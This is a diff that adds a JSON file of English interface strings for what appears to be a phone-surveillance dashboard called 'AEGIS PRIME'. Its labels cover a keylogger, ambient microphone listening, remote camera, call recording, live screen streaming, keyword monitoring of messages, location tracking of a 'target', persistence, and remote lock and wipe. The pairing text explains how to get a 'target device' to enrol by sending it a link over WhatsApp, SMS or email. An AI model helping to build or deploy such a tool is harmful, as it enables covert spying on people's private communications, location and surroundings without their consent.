@@ -1,0 +1,144 @@
+{
+  "app": {
+    "title": "AEGIS PRIME",
+    "subtitle": "War Room Dashboard v3.0",
+    "status": "SYSTEM: ONLINE",
+    "encrypted": "ENCRYPTED: AES-256",
+    "threat_level": "THREAT LEVEL: LOW",
+    "operator": "OPERATOR",
+    "operator_id": "ID: 88-ALPHA",
+    "no_alerts": "No new system alerts"
+  },
+  "sidebar": {
+    "my_subscriptions": "MY SUBSCRIPTIONS",
+    "add_device": "CONNECT DEVICE",
+    "dashboard": "Dashboard",
+    "remote_control": "REMOTE CONTROL",
+    "surroundings_listening": "Surroundings Listening",
+    "remote_camera": "Remote Camera",
+    "call_recorder": "Call Recorder",
+    "live_screenshots": "Live Screenshots",
+    "live_screen_streaming": "Live Screen Streaming",
+    "block_apps": "Block Apps",
+    "block_websites": "Block Websites",
+    "block_wifi": "Block Wi-Fi",
+    "ai_tools": "AI TOOLS",
+    "chatgpt": "ChatGPT",
+    "gemini": "Gemini",
+    "monitoring": "MONITORING",
+    "keywords": "Keywords",
+    "spy_panel": "Deep Surveillance"
+  },
+  "spy": {
+    "title": "DEEP SURVEILLANCE",
+    "subtitle": "Raw data access and hidden files",
+    "tabs": {
+      "keylogger": "KEYLOGGER",
+      "media": "FILES & MEDIA",
+      "schedule": "SCHEDULES"
+    },
+    "keylogger_status": "Keylogger Status",
+    "active": "ACTIVE (Accessibility Granted)",
+    "clear_logs": "CLEAR LOGS",
+    "new_rule": "NEW AUTO-RECORDING RULE",
+    "type": "Capture Type",
+    "interval": "Interval",
+    "duration": "Duration (if audio)",
+    "activate_schedule": "ACTIVATE SCHEDULE",
+    "active_rules": "Active Rules"
+  },
+  "keywords": {
+    "title": "KEYWORD SENTINEL",
+    "subtitle": "Semantic monitoring of messages and typing in real-time",
+    "active_monitoring": "ACTIVE MONITORING",
+    "add_trigger": "Add New Trigger",
+    "keyword_label": "Keyword / Phrase",
+    "placeholder": "Ex: help me, secret meeting...",
+    "category": "Category",
+    "severity": "Severity",
+    "activate_trigger": "ACTIVATE TRIGGER",
+    "latest_detections": "Latest Detections (Simulation)",
+    "active_triggers": "Active Triggers",
+    "synced": "SYNCED WITH AGENT"
+  },
+  "command": {
+    "title": "Protected Assets",
+    "no_assets": "NO ASSETS CONNECTED",
+    "waiting": "Waiting for agent telemetry...",
+    "ai_matrix": "AI Threat Matrix",
+    "matrix": {
+      "sentiment": "Sentiment Analysis",
+      "geo": "Geospatial Risk",
+      "chatgpt": "ChatGPT Integration"
+    },
+    "actions": {
+      "mic": "Mic",
+      "cam": "Cam",
+      "rec": "Rec",
+      "shot": "Shot",
+      "live": "Live",
+      "lock": "Lock",
+      "wipe": "Wipe"
+    }
+  },
+  "map": {
+    "target_locked": "TARGET LOCKED",
+    "device": "DEVICE",
+    "battery": "BATTERY",
+    "status": "STATUS",
+    "online": "ONLINE",
+    "offline": "OFFLINE",
+    "coords": "COORDS",
+    "overlay": "TACTICAL OVERLAY",
+    "friendly": "FRIENDLY UNITS",
+    "hostiles": "HOSTILES"
+  },
+  "feed": {
+    "title": "REALTIME ACTIVITY FEED",
+    "live": "LIVE"
+  },
+  "intel": {
+    "telemetry": "Device Telemetry",
+    "network": "Network",
+    "persistence": "Persistence",
+    "critical_alerts": "Critical Alerts",
+    "top_websites": "Top Visited Websites (24h)",
+    "top_contacts": "Top Contacts",
+    "calls": "calls",
+    "acknowledge": "Acknowledge",
+    "locate": "Locate"
+  },
+  "settings": {
+    "title": "System Configuration",
+    "language": "Interface Language",
+    "select_language": "Select Language",
+    "close": "Close",
+    "save": "Save Changes"
+  },
+  "pairing": {
+    "title": "ADD NEW DEVICE",
+    "scan_title": "Scan with Camera (HTTPS v2)",
+    "scan_subtitle": "Open your camera app or any QR reader. It will detect a secure HTTPS link.",
+    "scan_with_app": "Scan with Aegis Mobile App",
+    "scan_instruction": "Open the app on the target device and point the camera at this code.",
+    "deep_link_label": "DEEP LINK",
+    "deep_link_instruction": "Send this link to the target device via WhatsApp, SMS, or Email. Clicking it will automatically pair the device.",
+    "manual_code_label": "MANUAL CODE",
+    "manual_code_instruction": "Enter this 6-digit code manually in the Aegis Mobile App pairing screen.",
+    "nfc_title": "Ready to Pair via NFC",
+    "nfc_instruction": "Bring the target device close to this terminal (if supported) or use another admin device to tap.",
+    "expires_in": "SESSION EXPIRES IN:",
+    "id": "ID",
+    "copy_text": "Copy Text"
+  },
+  "auth": {
+    "title": "SYSTEM ACCESS",
+    "subtitle": "RESTRICTED AREA // AUTHORIZED PERSONNEL ONLY",
+    "email": "OPERATOR ID (EMAIL)",
+    "password": "ACCESS CODE",
+    "login": "INITIALIZE SESSION",
+    "forgot": "RECOVER ACCESS",
+    "error": "ACCESS DENIED: INVALID CREDENTIALS",
+    "loading": "ESTABLISHING SECURE CONNECTION..."
+  }
+}
